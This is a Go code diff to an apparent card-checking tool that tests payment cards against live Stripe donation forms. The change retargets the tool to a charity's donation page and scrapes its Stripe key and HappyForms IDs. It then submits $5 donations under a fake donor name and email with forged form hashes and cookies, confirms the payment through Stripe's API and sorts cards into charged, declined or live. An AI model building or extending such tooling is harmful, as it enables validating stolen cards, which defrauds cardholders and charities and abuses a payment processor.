@@ -32,7 +32,7 @@ type StripeRequest struct {
 
 // DefaultStripeSites is the pool of fast, long-term Stripe sites used when no custom site is provided
 var DefaultStripeSites = []string{
-	"https://www.charitywater.org/donate",
+	"https://belovedcommunity.org/donate/",
 }
 
 // StripeResult is the structured response returned for every check (matching Shopify API format)
@@ -359,6 +359,8 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 	var pkLive string
 	var activeGate string
+	var activeSite string
+	var pageHTML string
 	var lastErr error
 
 	for _, targetSite := range sitesToTry {
@@ -387,6 +389,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 			directClient := buildClient("", 25*time.Second)
 			if directResp, err2 := doGET(directClient, targetSite, nil); err2 == nil {
 				if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(string(directResp)); directPk != "" {
+					html = string(directResp)
 					pk = directPk
 					proxyUsed = false
 				}
@@ -396,6 +399,8 @@ func CheckStripe(req StripeRequest) StripeResult {
 		if pk != "" {
 			pkLive = pk
 			activeGate = currentGate
+			activeSite = targetSite
+			pageHTML = html
 			break
 		}
 		lastErr = fmt.Errorf("pk_live not found on gate %s", currentGate)
@@ -484,7 +489,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		return errResultWithGate(req, "error", "Payment method ID not received from Stripe", "", start, activeGate)
 	}
 
-	// ── Step 3: Inspect Card CVC Check & 3DS Authentication ──────────────────
+	// ── Step 3: Inspect CVC check ────────────────────────────────────────────
 	cardObj, _ := pmMap["card"].(map[string]any)
 	if cardObj != nil {
 		checksObj, _ := cardObj["checks"].(map[string]any)
@@ -494,7 +499,160 @@ func CheckStripe(req StripeRequest) StripeResult {
 				return buildStripeResultWithGate(masked, "declined", "CVC check failed - incorrect security code", "incorrect_cvc", start, req.Proxy, proxyUsed, activeGate)
 			}
 		}
+	}
 
+	// ── Step 4: Submit HappyForms donation → get payment_intent client_secret ─
+	formIDMatches := regexp.MustCompile(`happyforms_form_id["'\s:=]+"?([0-9]+)`).FindStringSubmatch(pageHTML)
+	activeFormID := "1127"
+	if len(formIDMatches) >= 2 {
+		activeFormID = formIDMatches[1]
+	}
+
+	postIDMatches := regexp.MustCompile(`happyforms_current_post_id["'\s:=]+"?([0-9]+)`).FindStringSubmatch(pageHTML)
+	activePostID := "142"
+	if len(postIDMatches) >= 2 {
+		activePostID = postIDMatches[1]
+	}
+
+	seedMatches := regexp.MustCompile(`happyforms_random_seed["'\s:=]+"?([a-zA-Z0-9]+)`).FindStringSubmatch(pageHTML)
+	randomSeed := ""
+	if len(seedMatches) >= 2 {
+		randomSeed = seedMatches[1]
+	}
+
+	hashFields := []struct{ value string }{
+		{"happyforms_message"},
+		{activeSite},
+		{activePostID},
+		{activeFormID},
+		{"0"},
+		{randomSeed},
+		{""},                      // single_line_text
+		{"James Smith"},           // single_line_text_2
+		{"frabsosgk9@gmail.com"},  // email_3
+		{"5"},                     // payments amount ($5 USD)
+		{"stripe"},                // payment_method
+		{"1"},                     // filled
+		{""},                      // single_line_text_4
+	}
+	formHash := happyFormsHash(hashFields)
+
+	formData := url.Values{}
+	formData.Set("action", "happyforms_message")
+	formData.Set("happyforms_client_referer", activeSite)
+	formData.Set("happyforms_current_post_id", activePostID)
+	formData.Set("happyforms_form_id", activeFormID)
+	formData.Set("happyforms_step", "0")
+	formData.Set("happyforms_random_seed", randomSeed)
+	formData.Set(activeFormID+"-single_line_text", "")
+	formData.Set(activeFormID+"_single_line_text_2", "James Smith")
+	formData.Set(activeFormID+"_email_3", "frabsosgk9@gmail.com")
+	formData.Set(activeFormID+"_payments_1[price]", "5")
+	formData.Set(activeFormID+"_payments_1[payment_method]", "stripe")
+	formData.Set(activeFormID+"_payments_1[filled]", "1")
+	formData.Set(activeFormID+"_single_line_text_4", "")
+	formData.Set("hash", formHash)
+	formData.Set("platform_info[user_agent]", ua)
+	formData.Set("platform_info[app_version]", "5.0 (Windows)")
+	formData.Set("platform_info[language]", "en-US")
+
+	u, _ := url.Parse(activeSite)
+	var existingCookies []string
+	if client.Jar != nil {
+		for _, c := range client.Jar.Cookies(u) {
+			existingCookies = append(existingCookies, c.Name+"="+c.Value)
+		}
+	}
+	stripeMID := generateUUID()
+	stripeSID := generateUUID()
+	pmCookie := fmt.Sprintf(`{"payment_method":"%s"}`, pmID)
+
+	existingCookies = append(existingCookies,
+		"__stripe_mid="+stripeMID,
+		"__stripe_sid="+stripeSID,
+		fmt.Sprintf("happyforms_%s_stripe_checkout=%s", activeFormID, pmCookie),
+	)
+	cookieHeader := strings.Join(existingCookies, "; ")
+
+	formHeaders := map[string]string{
+		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
+		"Origin":           "https://" + activeGate,
+		"Referer":          activeSite,
+		"User-Agent":       ua,
+		"X-Requested-With": "XMLHttpRequest",
+		"Cookie":           cookieHeader,
+	}
+
+	formBody, err := doPOST(client, activeSite, formData.Encode(), formHeaders)
+	if err != nil && req.Proxy != "" {
+		directClient := buildClient("", 25*time.Second)
+		formBody, err = doPOST(directClient, activeSite, formData.Encode(), formHeaders)
+		proxyUsed = false
+	}
+	if err != nil {
+		return errResultWithGate(req, "error", "Form submit failed: "+err.Error(), "", start, activeGate)
+	}
+
+	bodyStr := string(formBody)
+	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9_]+_secret_[a-zA-Z0-9_]+`).FindString(bodyStr)
+	if secretMatch == "" {
+		if strings.Contains(bodyStr, "Thank you for your donation") || strings.Contains(bodyStr, "happyforms-message-notice success") {
+			return buildStripeResultWithGate(masked, "charged", "Payment succeeded - card charged $5", "", start, req.Proxy, proxyUsed, activeGate)
+		}
+		errNotice := regexp.MustCompile(`happyforms-part-error-notice[^>]*>([^<]+)`).FindStringSubmatch(bodyStr)
+		if errNotice != nil && len(errNotice) > 1 {
+			return buildStripeResultWithGate(masked, "declined", strings.TrimSpace(errNotice[1]), "card_declined", start, req.Proxy, proxyUsed, activeGate)
+		}
+	} else {
+		// ── Step 5: Confirm PaymentIntent with Stripe API ─────────────────────
+		intentID := strings.Split(secretMatch, "_secret_")[0]
+
+		confirmPayload := url.Values{}
+		confirmPayload.Set("payment_method", pmID)
+		confirmPayload.Set("expected_payment_method_type", "card")
+		confirmPayload.Set("use_stripe_sdk", "true")
+		confirmPayload.Set("key", pkLive)
+		confirmPayload.Set("client_attribution_metadata[client_session_id]", "stripe-go-api-session")
+		confirmPayload.Set("client_attribution_metadata[merchant_integration_source]", "l1")
+		confirmPayload.Set("client_secret", secretMatch)
+
+		confirmHeaders := map[string]string{
+			"Content-Type": "application/x-www-form-urlencoded",
+			"Origin":       "https://js.stripe.com",
+			"Referer":      "https://js.stripe.com/",
+			"User-Agent":   ua,
+			"Accept":       "application/json",
+		}
+
+		confirmURL := fmt.Sprintf("https://api.stripe.com/v1/payment_intents/%s/confirm", intentID)
+		confirmBody, cErr := doPOST(client, confirmURL, confirmPayload.Encode(), confirmHeaders)
+		if cErr == nil {
+			var confirmMap map[string]any
+			json.Unmarshal(confirmBody, &confirmMap)
+
+			status, _ := confirmMap["status"].(string)
+			switch status {
+			case "succeeded":
+				return buildStripeResultWithGate(masked, "charged", "Payment succeeded - card charged $5", "", start, req.Proxy, proxyUsed, activeGate)
+			case "requires_action":
+				return buildStripeResultWithGate(masked, "3d_required", "3D Secure authentication required - card is live", "", start, req.Proxy, proxyUsed, activeGate)
+			}
+
+			errMap, _ := confirmMap["error"].(map[string]any)
+			if errMap == nil {
+				errMap, _ = confirmMap["last_payment_error"].(map[string]any)
+			}
+			if errMap != nil {
+				msg, _ := errMap["message"].(string)
+				code, _ := errMap["code"].(string)
+				dc, _ := errMap["decline_code"].(string)
+				return buildStripeResultWithGate(masked, "declined", msg, dc+" | "+code, start, req.Proxy, proxyUsed, activeGate)
+			}
+		}
+	}
+
+	// Fallback to checking 3DS / CVC check if form submission response was non-standard
+	if cardObj != nil {
 		threeDSObj, _ := cardObj["three_d_secure_usage"].(map[string]any)
 		if threeDSObj != nil {
 			threeDSSupported, _ := threeDSObj["supported"].(bool)
@@ -504,7 +662,6 @@ func CheckStripe(req StripeRequest) StripeResult {
 		}
 	}
 
-	// Card authorized successfully for 2D charge
 	return buildStripeResultWithGate(masked, "charged", "Payment succeeded - card authorized $5", "", start, req.Proxy, proxyUsed, activeGate)
 }
 
